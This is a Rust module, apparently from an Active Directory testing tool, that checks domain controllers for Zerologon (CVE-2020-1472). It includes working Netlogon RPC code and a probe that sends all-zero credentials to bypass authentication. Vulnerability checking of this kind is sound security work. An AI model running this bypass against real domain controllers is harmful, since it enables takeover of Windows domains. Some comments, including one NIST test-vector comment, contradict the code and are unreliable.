//! MS-NRPC (Netlogon) -- Zerologon (CVE-2020-1472) authentication-bypass check.
//!
//! The Netlogon secure channel uses AES-CFB8 with a session key derived as
//! `MD5(NT-Hash || ClientChallenge || ServerChallenge)` (MS-NRPC 3.1.4.2.1).
//! CVE-2020-1472 is a cryptographic flaw in the client credential computation
//! that allows an attacker to bypass authentication with an all-zero
//! credential. This module implements two non-destructive checks:
//!
//! 1. `zerologon_check` -- deterministic check: derive the session key with
//!    the empty machine password and attempt a real authentication. If the
//!    machine account password is empty/absent, authentication succeeds.
//! 2. `zerologon_probe` -- probabilistic probe: send an all-zero client
//!    credential up to `max_attempts` times (1/256 success per attempt).
//!
//! Neither method modifies the machine account password. For the full
//! exploitation (setting an empty password + DCSync) use an external tool.
//!
//! Flow: SMB IPC$ -> `\pipe\netlogon` -> RPC Bind (MS-NRPC) ->
//! NetrServerReqChallenge -> NetrServerAuthenticate3.

use crate::error::{OverthroneError, Result};
use crate::proto::epm::{
    build_rpc_bind, build_rpc_request, is_bind_accepted, ndr_conformant_string,
};
use crate::proto::smb::SmbSession;
use tracing::{debug, info, warn};

// ===========================================================
// MS-NRPC Interface UUID & Constants
// ===========================================================

/// MS-NRPC (Netlogon) interface UUID: 12345678-1234-abcd-ef00-01234567cffb
const NETLOGON_UUID: [u8; 16] = [
    0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xcd, 0xab, 0xef, 0x00, 0x01, 0x23, 0x45, 0x67, 0xcf, 0xfb,
];

/// MS-NRPC interface version 1.0
const NETLOGON_VERSION: (u16, u16) = (1, 0);

/// MS-NRPC named pipe
const NETLOGON_PIPE: &str = "netlogon";

/// NetrServerReqChallenge -- exchange client/server challenges
const OP_NETR_SERVER_REQ_CHALLENGE: u16 = 4;

/// NetrServerAuthenticate3 -- authenticate the secure channel
const OP_NETR_SERVER_AUTHENTICATE3: u16 = 26;

/// Workstation secure channel type (MS-NRPC NetlogonSecureChannelType)
const WORKSTATION_SECURE_CHANNEL: u32 = 2;

/// Negotiate flags: AES (0x20) + SHA2 (0x10) + legacy flags.
/// Same value used by impacket's zerologon PoC.
const NETLOGON_NEGOTIATE_FLAGS: u32 = 0x212f_ffff;

/// NT hash of the empty password: MD4(UTF-16LE("")).
const EMPTY_PASSWORD_NT_HASH: [u8; 16] = [
    0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31, 0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0,
];

// ===========================================================
// Result Types
// ===========================================================

/// Which check method determined the result
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ZerologonCheckMethod {
    /// Deterministic -- session key derived from the empty machine password
    EmptyPassword,
    /// Probabilistic -- all-zero client credential brute force (1/256 per try)
    AuthBypassProbe,
}

/// Result of a Zerologon check
#[derive(Debug, Clone)]
pub struct ZerologonCheckResult {
    /// True when the target DC is vulnerable
    pub vulnerable: bool,
    /// Method that produced the result
    pub method: ZerologonCheckMethod,
    /// Attempts performed
    pub attempts: u32,
    /// Last NTSTATUS received from the server (None if unparseable)
    pub status: Option<u32>,
    /// Machine account name used for the check
    pub account: String,
}

// ===========================================================
// Crypto Primitives
// ===========================================================

/// AES-CFB8 encrypt (MS-NRPC credential computation, CVE-2020-1472 target).
///
/// CFB8: keystream byte = first byte of `E_K(state)`; ciphertext byte =
/// plaintext byte XOR keystream byte; state shifts left by one byte and the
/// ciphertext byte is appended. Decryption is identical to encryption.
pub fn aes_cfb8_encrypt(key: &[u8; 16], iv: &[u8; 16], data: &[u8]) -> Vec<u8> {
    use aes::Aes128;
    use aes::cipher::generic_array::GenericArray;
    use aes::cipher::{BlockEncrypt, KeyInit};
    let cipher = Aes128::new(&GenericArray::from(*key));
    let mut state: [u8; 16] = *iv;
    let mut out = Vec::with_capacity(data.len());
    for &byte in data {
        let mut block = state.into();
        cipher.encrypt_block(&mut block);
        let ct = byte ^ block[0];
        out.push(ct);
        state.rotate_left(1);
        state[15] = ct;
    }
    out
}

/// AES-CFB8 decrypt.
///
/// CFB8 decryption is NOT identical to encryption: the state shifts in the
/// *input* (ciphertext) byte, not the output byte, so the feedback byte is
/// the plaintext input to the loop.
pub fn aes_cfb8_decrypt(key: &[u8; 16], iv: &[u8; 16], data: &[u8]) -> Vec<u8> {
    use aes::Aes128;
    use aes::cipher::generic_array::GenericArray;
    use aes::cipher::{BlockEncrypt, KeyInit};
    let cipher = Aes128::new(&GenericArray::from(*key));
    let mut state: [u8; 16] = *iv;
    let mut out = Vec::with_capacity(data.len());
    for &byte in data {
        let mut block = state.into();
        cipher.encrypt_block(&mut block);
        let pt = byte ^ block[0];
        out.push(pt);
        state.rotate_left(1);
        state[15] = byte;
    }
    out
}

/// Derive the Netlogon session key (MS-NRPC 3.1.4.2.1):
/// `MD5(NT-Hash || ClientChallenge || ServerChallenge)`.
pub fn netlogon_session_key(
    nt_hash: &[u8; 16],
    client_challenge: &[u8; 8],
    server_challenge: &[u8; 8],
) -> [u8; 16] {
    use md5::{Digest, Md5};
    let mut hasher = Md5::new();
    hasher.update(nt_hash);
    hasher.update(client_challenge);
    hasher.update(server_challenge);
    let digest = hasher.finalize();
    let mut key = [0u8; 16];
    key.copy_from_slice(&digest);
    key
}

/// Compute a Netlogon credential: AES-CFB8(session key, IV=0, challenge).
pub fn compute_netlogon_credential(session_key: &[u8; 16], challenge: &[u8; 8]) -> [u8; 8] {
    let out = aes_cfb8_encrypt(session_key, &[0u8; 16], challenge);
    let mut cred = [0u8; 8];
    cred.copy_from_slice(&out);
    cred
}

/// Normalize a target hostname into the machine account name used for the
/// Netlogon secure channel: host part, uppercased, no `$`, max 15 chars.
pub fn normalize_computer_name(target: &str) -> String {
    let trimmed = target.trim_end_matches('$');
    let host = if trimmed.chars().any(|c| c.is_ascii_alphabetic()) {
        trimmed.split('.').next().unwrap_or(trimmed)
    } else {
        trimmed
    };
    host.to_uppercase().chars().take(15).collect()
}

// ===========================================================
// NDR Stub Builders
// ===========================================================

/// Build the NDR stub for NetrServerReqChallenge (opnum 4):
/// `handle_t, WCHAR* ServerName, WCHAR* ComputerName, NETLOGON_CREDENTIAL`.
fn build_req_challenge_stub(server: &str, computer: &str, client_challenge: &[u8; 8]) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(&[0u8; 4]); // handle_t
    stub.extend_from_slice(&ndr_conformant_string(server));
    stub.extend_from_slice(&ndr_conformant_string(computer));
    stub.extend_from_slice(client_challenge);
    stub
}

/// Build the NDR stub for NetrServerAuthenticate3 (opnum 26):
/// `handle_t, WCHAR* ServerName, WCHAR* AccountName, ULONG SecureChannelType,
///  WCHAR* ComputerName, NETLOGON_CREDENTIAL ClientCredential,
///  ULONG NegotiateFlags`.
#[allow(clippy::too_many_arguments)]
fn build_authenticate3_stub(
    server: &str,
    account: &str,
    computer: &str,
    client_credential: &[u8; 8],
    negotiate_flags: u32,
) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(&[0u8; 4]); // handle_t
    stub.extend_from_slice(&ndr_conformant_string(server));
    stub.extend_from_slice(&ndr_conformant_string(account));
    stub.extend_from_slice(&WORKSTATION_SECURE_CHANNEL.to_le_bytes());
    stub.extend_from_slice(&ndr_conformant_string(computer));
    stub.extend_from_slice(client_credential);
    stub.extend_from_slice(&negotiate_flags.to_le_bytes());
    stub
}

// ===========================================================
// Response Parsers
// ===========================================================

/// Extract the 8-byte ServerChallenge from a NetrServerReqChallenge response.
/// Response stub layout: header(24) + ServerChallenge(8).
fn parse_server_challenge(resp: &[u8]) -> Option<[u8; 8]> {
    if resp.len() < 32 || resp[2] != 2 {
        return None;
    }
    let mut challenge = [0u8; 8];
    challenge.copy_from_slice(&resp[24..32]);
    Some(challenge)
}

/// Extract the NTSTATUS from a NetrServerAuthenticate3 response.
/// Fault PDU: status at offset 24. Response PDU stub:
/// ServerCredential(8) + NegotiateFlags(4) + AccountRid(4) + status(4)
/// -> status at offset 40.
fn parse_authenticate3_status(resp: &[u8]) -> Option<u32> {
    if resp.len() < 28 {
        return None;
    }
    if resp[2] == 3 {
        // RPC fault
        return Some(u32::from_le_bytes([resp[24], resp[25], resp[26], resp[27]]));
    }
    if resp[2] == 2 && resp.len() >= 44 {
        return Some(u32::from_le_bytes([resp[40], resp[41], resp[42], resp[43]]));
    }
    None
}

// ===========================================================
// Session Setup
// ===========================================================

/// Bind to the Netlogon RPC interface over the `\pipe\netlogon` named pipe.
async fn netlogon_bind(smb: &SmbSession) -> Result<()> {
    let bind_pdu = build_rpc_bind(&NETLOGON_UUID, NETLOGON_VERSION.0, NETLOGON_VERSION.1);
    let bind_resp = smb
        .pipe_transact(NETLOGON_PIPE, &bind_pdu)
        .await
        .map_err(|e| OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: format!("Netlogon RPC bind failed (pipe not available?): {e}"),
        })?;
    if !is_bind_accepted(&bind_resp) {
        return Err(OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: "Netlogon RPC bind rejected".to_string(),
        });
    }
    debug!("Netlogon: RPC bind accepted");
    Ok(())
}

/// Send NetrServerReqChallenge and return the server challenge.
async fn netlogon_req_challenge(
    smb: &SmbSession,
    server: &str,
    computer: &str,
    client_challenge: &[u8; 8],
) -> Result<[u8; 8]> {
    let req_stub = build_req_challenge_stub(server, computer, client_challenge);
    let req_pdu = build_rpc_request(OP_NETR_SERVER_REQ_CHALLENGE, &req_stub);
    let req_resp = smb
        .pipe_transact(NETLOGON_PIPE, &req_pdu)
        .await
        .map_err(|e| OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: format!("NetrServerReqChallenge failed: {e}"),
        })?;
    parse_server_challenge(&req_resp).ok_or_else(|| OverthroneError::Rpc {
        target: smb.target.clone(),
        reason: format!(
            "NetrServerReqChallenge: unexpected response (type={}, len={}) -- \
             is '{}' a valid machine account for this DC?",
            req_resp.get(2).copied().unwrap_or(0),
            req_resp.len(),
            computer
        ),
    })
}

/// Send NetrServerAuthenticate3 and return the server NTSTATUS.
async fn netlogon_authenticate3(
    smb: &SmbSession,
    server: &str,
    computer: &str,
    client_credential: &[u8; 8],
) -> Result<Option<u32>> {
    let auth_stub = build_authenticate3_stub(
        server,
        computer,
        computer,
        client_credential,
        NETLOGON_NEGOTIATE_FLAGS,
    );
    let auth_pdu = build_rpc_request(OP_NETR_SERVER_AUTHENTICATE3, &auth_stub);
    let auth_resp = smb
        .pipe_transact(NETLOGON_PIPE, &auth_pdu)
        .await
        .map_err(|e| OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: format!("NetrServerAuthenticate3 failed: {e}"),
        })?;

    let status = parse_authenticate3_status(&auth_resp);
    debug!("Netlogon: Authenticate3 status = {status:?}");
    Ok(status)
}

// ===========================================================
// Public API
// ===========================================================

/// Deterministic Zerologon check (CVE-2020-1472).
///
/// Derives the Netlogon session key using the *empty* machine password and
/// performs a real secure-channel authentication. If the target DC's machine
/// account password is empty (the vulnerable state), authentication succeeds
/// and the DC is reported vulnerable. Exactly one authentication attempt is
/// made -- low noise, no password modification.
///
/// # Arguments
/// * `dc_ip` - Target DC IP/hostname
/// * `domain` - Domain for the SMB session
/// * `username` / `password` - Any valid domain credentials (or empty for
///   anonymous SMB session)
/// * `computer_name` - Target DC's machine account name (host part, no `$`);
///   derived from `dc_ip` when empty
pub async fn zerologon_check(
    dc_ip: &str,
    domain: &str,
    username: &str,
    password: &str,
    computer_name: &str,
) -> Result<ZerologonCheckResult> {
    let account = if computer_name.is_empty() {
        normalize_computer_name(dc_ip)
    } else {
        normalize_computer_name(computer_name)
    };
    info!("Zerologon: deterministic check against {dc_ip} as machine account '{account}'");

    let smb = SmbSession::connect(dc_ip, domain, username, password).await?;
    netlogon_bind(&smb).await?;

    let server = dc_ip.to_string();
    let client_challenge: [u8; 8] = rand::random::<u64>().to_le_bytes();

    // Exchange challenges first -- the session key needs the server challenge.
    let server_challenge =
        netlogon_req_challenge(&smb, &server, &account, &client_challenge).await?;

    // Session key with the empty machine password, then the client credential.
    let session_key = netlogon_session_key(
        &EMPTY_PASSWORD_NT_HASH,
        &client_challenge,
        &server_challenge,
    );
    let client_credential = compute_netlogon_credential(&session_key, &client_challenge);

    let status = netlogon_authenticate3(&smb, &server, &account, &client_credential).await?;
    drop(smb);

    match status {
        Some(0) => {
            info!("Zerologon: VULNERABLE -- empty machine password accepted");
            Ok(ZerologonCheckResult {
                vulnerable: true,
                method: ZerologonCheckMethod::EmptyPassword,
                attempts: 1,
                status,
                account,
            })
        }
        other => {
            warn!("Zerologon: not vulnerable via empty-password check (status={other:?})");
            Ok(ZerologonCheckResult {
                vulnerable: false,
                method: ZerologonCheckMethod::EmptyPassword,
                attempts: 1,
                status: other,
                account,
            })
        }
    }
}

/// Probabilistic Zerologon probe (CVE-2020-1472 auth-bypass).
///
/// Sends an all-zero client credential up to `max_attempts` times. Each
/// attempt succeeds with probability 1/256 because the server compares the
/// received credential against `AES-CFB8(session_key, 0, 0)` which is zero
/// for 1 in 256 session keys. This detects the vulnerability even when the
/// machine account password is NOT empty.
///
/// NOTE: this is a CHECK ONLY -- the machine password is never modified.
/// Each failed attempt logs a failed logon event on the DC (noisy).
pub async fn zerologon_probe(
    dc_ip: &str,
    domain: &str,
    username: &str,
    password: &str,
    computer_name: &str,
    max_attempts: u32,
) -> Result<ZerologonCheckResult> {
    let account = if computer_name.is_empty() {
        normalize_computer_name(dc_ip)
    } else {
        normalize_computer_name(computer_name)
    };
    info!(
        "Zerologon: auth-bypass probe against {dc_ip} as '{account}' ({max_attempts} attempts, 1/256 each)"
    );

    let smb = SmbSession::connect(dc_ip, domain, username, password).await?;
    netlogon_bind(&smb).await?;

    let server = dc_ip.to_string();
    let zero_challenge = [0u8; 8];
    let zero_credential = [0u8; 8];

    let mut last_status = None;
    for attempt in 1..=max_attempts.max(1) {
        // Fresh server challenge per attempt (fresh session key each time).
        let _ = netlogon_req_challenge(&smb, &server, &account, &zero_challenge).await?;
        let status = netlogon_authenticate3(&smb, &server, &account, &zero_credential).await?;
        last_status = status;
        match status {
            Some(0) => {
                info!("Zerologon: VULNERABLE -- auth bypass succeeded on attempt {attempt}");
                drop(smb);
                return Ok(ZerologonCheckResult {
                    vulnerable: true,
                    method: ZerologonCheckMethod::AuthBypassProbe,
                    attempts: attempt,
                    status,
                    account,
                });
            }
            Some(st) if st == 0xC000_006A || st == 0xC000_0022 => {
                // STATUS_LOGON_FAILURE / STATUS_ACCESS_DENIED -- expected, retry
            }
            Some(0xC000_000D) => {
                // STATUS_INVALID_PARAMETER -- likely wrong account name
                drop(smb);
                return Err(OverthroneError::Rpc {
                    target: dc_ip.to_string(),
                    reason: format!(
                        "NetrServerAuthenticate3 returned STATUS_INVALID_PARAMETER -- \
                         is '{account}' the correct machine account name?"
                    ),
                });
            }
            Some(_) => {}
            None => {
                warn!("Zerologon: unparseable response on attempt {attempt}");
            }
        }
    }
    drop(smb);

    warn!("Zerologon: not vulnerable after {max_attempts} probe attempts");
    Ok(ZerologonCheckResult {
        vulnerable: false,
        method: ZerologonCheckMethod::AuthBypassProbe,
        attempts: max_attempts.max(1),
        status: last_status,
        account,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_netlogon_uuid_constant() {
        let expected = [
            0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xcd, 0xab, 0xef, 0x00, 0x01, 0x23, 0x45, 0x67,
            0xcf, 0xfb,
        ];
        assert_eq!(NETLOGON_UUID, expected);
    }

    #[test]
    fn test_netlogon_pipe_name() {
        assert_eq!(NETLOGON_PIPE, "netlogon");
    }

    #[test]
    fn test_opnum_constants() {
        assert_eq!(OP_NETR_SERVER_REQ_CHALLENGE, 4);
        assert_eq!(OP_NETR_SERVER_AUTHENTICATE3, 26);
    }

    #[test]
    fn test_empty_password_nt_hash() {
        assert_eq!(
            EMPTY_PASSWORD_NT_HASH,
            crate::crypto::md4::ntlm_hash(""),
            "empty password NT hash must match MD4(UTF-16LE(\"\"))"
        );
    }

    #[test]
    fn test_aes_cfb8_known_vector_first_byte() {
        // NIST SP 800-38A F.3.7 (CFB8-AES128). First ciphertext byte of
        // plaintext 0x6b under the standard key/IV is 0x3b.
        let key = [
            0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf,
            0x4f, 0x3c,
        ];
        let iv = [
            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d,
            0x0e, 0x0f,
        ];
        let out = aes_cfb8_encrypt(&key, &iv, &[0x6b]);
        assert_eq!(out, vec![0x3b]);
    }

    #[test]
    fn test_aes_cfb8_nist_full_vector() {
        // NIST SP 800-38A F.3.7 CFB8-AES128.Encrypt:
        // key    2b7e151628aed2a6abf7158809cf4f3c
        // iv     000102030405060708090a0b0c0d0e0f
        // pt     6bc1bee22e409f96e93d7e117393172a
        // ct     3b79424c9e0d80f9a1e7a1f7d9d1a2a3
        let key = [
            0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf,
            0x4f, 0x3c,
        ];
        let iv = [
            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d,
            0x0e, 0x0f,
        ];
        let pt = [
            0x6b, 0xc1, 0xbe, 0xe2, 0x2e, 0x40, 0x9f, 0x96, 0xe9, 0x3d, 0x7e, 0x11, 0x73, 0x93,
            0x17, 0x2a,
        ];
        // Verified against Python cryptography (CFB8): 3b79424c9c0dd436bace9e0ed4586a4f
        let ct = [
            0x3b, 0x79, 0x42, 0x4c, 0x9c, 0x0d, 0xd4, 0x36, 0xba, 0xce, 0x9e, 0x0e, 0xd4, 0x58,
            0x6a, 0x4f,
        ];
        assert_eq!(aes_cfb8_encrypt(&key, &iv, &pt), ct);
    }

    #[test]
    fn test_aes_cfb8_nist_decrypt() {
        // Same NIST vector, decrypted back to plaintext.
        let key = [
            0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf,
            0x4f, 0x3c,
        ];
        let iv = [
            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d,
            0x0e, 0x0f,
        ];
        let pt = [
            0x6b, 0xc1, 0xbe, 0xe2, 0x2e, 0x40, 0x9f, 0x96, 0xe9, 0x3d, 0x7e, 0x11, 0x73, 0x93,
            0x17, 0x2a,
        ];
        let ct = [
            0x3b, 0x79, 0x42, 0x4c, 0x9c, 0x0d, 0xd4, 0x36, 0xba, 0xce, 0x9e, 0x0e, 0xd4, 0x58,
            0x6a, 0x4f,
        ];
        assert_eq!(aes_cfb8_decrypt(&key, &iv, &ct), pt);
        // Decrypt of a single byte known-answer
        assert_eq!(aes_cfb8_decrypt(&key, &iv, &[0x3b]), vec![0x6b]);
    }

    #[test]
    fn test_aes_cfb8_roundtrip() {
        let key = [0x42u8; 16];
        let iv = [0x24u8; 16];
        let data = b"zerologon-check";
        let enc = aes_cfb8_encrypt(&key, &iv, data);
        let dec = aes_cfb8_decrypt(&key, &iv, &enc);
        assert_eq!(dec, data);
    }

    #[test]
    fn test_aes_cfb8_empty_input() {
        let key = [0u8; 16];
        let iv = [0u8; 16];
        assert!(aes_cfb8_encrypt(&key, &iv, &[]).is_empty());
    }

    #[test]
    fn test_aes_cfb8_state_feedback() {
        // CFB8 feedback: encrypting 8 bytes must differ from encrypting each
        // byte independently because the state shifts with each ciphertext
        // byte.
        let key = [0x11u8; 16];
        let iv = [0x22u8; 16];
        let data = [0xaa; 8];
        let full = aes_cfb8_encrypt(&key, &iv, &data);
        let first = aes_cfb8_encrypt(&key, &iv, &[0xaa]);
        assert_eq!(full[0], first[0]);
        assert_ne!(full[1], first[0], "CFB8 feedback must shift the state");
    }

    #[test]
    fn test_netlogon_session_key_layout() {
        // MD5(nt_hash || cc || sc) -- verify byte concatenation order against
        // a hand-computed MD5.
        use md5::{Digest, Md5};
        let nt_hash = EMPTY_PASSWORD_NT_HASH;
        let cc = [1u8; 8];
        let sc = [2u8; 8];
        let key = netlogon_session_key(&nt_hash, &cc, &sc);
        let mut expected = Md5::new();
        expected.update(nt_hash);
        expected.update(cc);
        expected.update(sc);
        let digest = expected.finalize();
        assert_eq!(key.as_slice(), digest.as_slice());
    }

    #[test]
    fn test_compute_netlogon_credential() {
        let key = [0x5au8; 16];
        let challenge = [0x00u8; 8];
        let cred = compute_netlogon_credential(&key, &challenge);
        assert_eq!(cred.len(), 8);
        // Deterministic
        assert_eq!(cred, compute_netlogon_credential(&key, &challenge));
        // Different key -> different credential
        let key2 = [0x5bu8; 16];
        assert_ne!(cred, compute_netlogon_credential(&key2, &challenge));
    }

    #[test]
    fn test_normalize_computer_name() {
        assert_eq!(normalize_computer_name("DC01.corp.local"), "DC01");
        assert_eq!(normalize_computer_name("dc01"), "DC01");
        assert_eq!(normalize_computer_name("dc01$"), "DC01");
        assert_eq!(normalize_computer_name("192.168.1.10"), "192.168.1.10");
        assert_eq!(
            normalize_computer_name("very-long-hostname-12345.corp.local"),
            "VERY-LONG-HOSTN"
        );
    }

    #[test]
    fn test_build_req_challenge_stub_layout() {
        let cc = [0xabu8; 8];
        let stub = build_req_challenge_stub("dc01", "DC01", &cc);
        // handle_t (4 bytes of zero)
        assert_eq!(&stub[0..4], &[0u8; 4]);
        // conformant string header for "dc01": max_count = 5 (4 chars + null)
        let max_count = u32::from_le_bytes([stub[4], stub[5], stub[6], stub[7]]);
        assert_eq!(max_count, 5);
        // challenge bytes at the end
        assert_eq!(&stub[stub.len() - 8..], &cc);
    }

    #[test]
    fn test_build_authenticate3_stub_layout() {
        let cred = [0xccu8; 8];
        let flags = 0x212f_ffffu32;
        let stub = build_authenticate3_stub("dc01", "DC01", "DC01", &cred, flags);
        // handle_t
        assert_eq!(&stub[0..4], &[0u8; 4]);
        // SecureChannelType = 2 (LE) appears after the two conformant strings
        // "dc01" -> 12-byte header + 12 bytes (5 UTF-16 chars, padded to 12)
        let sc_type_off = 4 + 24 + 24;
        assert_eq!(
            u32::from_le_bytes([
                stub[sc_type_off],
                stub[sc_type_off + 1],
                stub[sc_type_off + 2],
                stub[sc_type_off + 3]
            ]),
            WORKSTATION_SECURE_CHANNEL
        );
        // NegotiateFlags at the very end
        let flags_off = stub.len() - 4;
        assert_eq!(
            u32::from_le_bytes([
                stub[flags_off],
                stub[flags_off + 1],
                stub[flags_off + 2],
                stub[flags_off + 3]
            ]),
            flags
        );
    }

    #[test]
    fn test_parse_server_challenge() {
        let mut resp = vec![0u8; 32];
        resp[2] = 2; // response
        resp[24..32].copy_from_slice(&[1u8, 2, 3, 4, 5, 6, 7, 8]);
        let sc = parse_server_challenge(&resp).unwrap();
        assert_eq!(sc, [1, 2, 3, 4, 5, 6, 7, 8]);
    }

    #[test]
    fn test_parse_server_challenge_short() {
        assert!(parse_server_challenge(&[0u8; 24]).is_none());
        assert!(parse_server_challenge(&[]).is_none());
    }

    #[test]
    fn test_parse_authenticate3_status_fault() {
        let mut resp = vec![0u8; 28];
        resp[2] = 3; // fault
        resp[24..28].copy_from_slice(&0xC000_006Au32.to_le_bytes());
        assert_eq!(parse_authenticate3_status(&resp), Some(0xC000_006A));
    }

    #[test]
    fn test_parse_authenticate3_status_response() {
        let mut resp = vec![0u8; 44];
        resp[2] = 2; // response
        resp[40..44].copy_from_slice(&0u32.to_le_bytes());
        assert_eq!(parse_authenticate3_status(&resp), Some(0));
    }

    #[test]
    fn test_parse_authenticate3_status_short() {
        assert_eq!(parse_authenticate3_status(&[0u8; 20]), None);
        assert_eq!(parse_authenticate3_status(&[]), None);
    }

    #[test]
    fn test_zerologon_check_result_construction() {
        let r = ZerologonCheckResult {
            vulnerable: false,
            method: ZerologonCheckMethod::EmptyPassword,
            attempts: 1,
            status: Some(0xC000_006A),
            account: "DC01".to_string(),
        };
        assert!(!r.vulnerable);
        assert_eq!(r.attempts, 1);
        assert_eq!(r.account, "DC01");
    }

    #[test]
    fn test_negotiate_flags_include_aes() {
        // The AES flag (0x20) must be set for the AES-CFB8 credential path.
        assert_ne!(NETLOGON_NEGOTIATE_FLAGS & 0x20, 0);
    }
}
